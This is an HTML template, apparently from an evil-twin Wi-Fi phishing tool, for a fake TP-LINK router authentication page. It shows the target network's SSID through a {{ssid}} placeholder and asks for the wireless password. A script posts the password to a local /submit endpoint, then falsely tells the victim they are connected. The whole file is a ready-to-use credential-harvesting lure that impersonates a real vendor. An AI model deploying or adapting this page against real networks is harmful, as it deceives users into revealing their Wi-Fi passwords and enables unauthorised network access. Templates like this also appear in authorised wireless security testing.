<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TP-LINK Wireless Router {{ssid}}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: 40px auto;
            background: white;
            border: 1px solid #ddd;
        }

        .header {
            background: linear-gradient(to bottom, #009fe8, #0088cc);
            padding: 15px 20px;
            color: white;
            display: flex;
            align-items: center;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-right: 15px;
        }

        .header-text {
            font-size: 14px;
        }

        .content {
            padding: 30px;
        }

        .title {
            font-size: 18px;
            color: #333;
            margin-bottom: 10px;
            border-bottom: 2px solid #009fe8;
            padding-bottom: 10px;
        }

        .info-box {
            background: #f9f9f9;
            border: 1px solid #e0e0e0;
            padding: 15px;
            margin: 20px 0;
            border-radius: 3px;
        }

        .info-label {
            font-weight: bold;
            color: #555;
            margin-bottom: 5px;
        }

        .info-value {
            color: #009fe8;
            font-size: 16px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        input[type="password"] {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #ccc;
            font-size: 14px;
            border-radius: 2px;
        }

        input[type="password"]:focus {
            outline: none;
            border-color: #009fe8;
        }

        .button-group {
            margin-top: 25px;
            display: flex;
            gap: 10px;
        }

        button {
            padding: 8px 20px;
            font-size: 14px;
            border: 1px solid #ccc;
            cursor: pointer;
            border-radius: 2px;
            background: linear-gradient(to bottom, #f9f9f9, #e0e0e0);
            color: #333;
        }

        button[type="submit"] {
            background: linear-gradient(to bottom, #009fe8, #0088cc);
            border-color: #0088cc;
            color: white;
            font-weight: bold;
        }

        button:hover {
            opacity: 0.9;
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .error {
            background: #ffebee;
            border: 1px solid #ef5350;
            color: #c62828;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 3px;
            font-size: 14px;
            display: none;
        }

        .error.show {
            display: block;
        }

        .note {
            color: #666;
            font-size: 12px;
            margin-top: 8px;
        }

        .footer {
            background: #f5f5f5;
            padding: 15px 20px;
            border-top: 1px solid #ddd;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">TP-LINK</div>
            <div class="header-text">Wireless Router Configuration</div>
        </div>

        <div class="content">
            <div class="title">Wireless Network Authentication</div>

            <div class="info-box">
                <div class="info-label">Network Name (SSID):</div>
                <div class="info-value">{{ssid}}</div>
            </div>

            <div class="error" id="error"></div>

            <form id="loginForm" method="POST" action="/submit">
                <div class="form-group">
                    <label for="password">Wireless Password:</label>
                    <input
                        type="password"
                        id="password"
                        name="password"
                        required
                        autocomplete="off"
                        placeholder="Enter wireless password"
                    >
                    <div class="note">Please enter the password to access this wireless network.</div>
                </div>

                <div class="button-group">
                    <button type="submit" id="submitBtn">Connect</button>
                    <button type="button" onclick="document.getElementById('password').value=''">Clear</button>
                </div>
            </form>
        </div>

        <div class="footer">
            Copyright Â© 2025 TP-LINK Technologies Co., Ltd. All rights reserved.
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const errorDiv = document.getElementById('error');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            submitBtn.disabled = true;
            submitBtn.textContent = 'Connecting...';
            errorDiv.classList.remove('show');

            const formData = new FormData(form);

            fetch('/submit', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    submitBtn.textContent = 'Connected Successfully';
                    errorDiv.textContent = 'Authentication successful! You are now connected.';
                    errorDiv.style.background = '#e8f5e9';
                    errorDiv.style.border = '1px solid #66bb6a';
                    errorDiv.style.color = '#2e7d32';
                    errorDiv.classList.add('show');

                    setTimeout(() => {
                        window.location.href = '/success';
                    }, 1500);
                } else {
                    throw new Error(data.message || 'Authentication failed');
                }
            })
            .catch(error => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Connect';
                errorDiv.textContent = 'Authentication failed. Please check your password and try again.';
                errorDiv.classList.add('show');
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            });
        });
    </script>
</body>
</html>
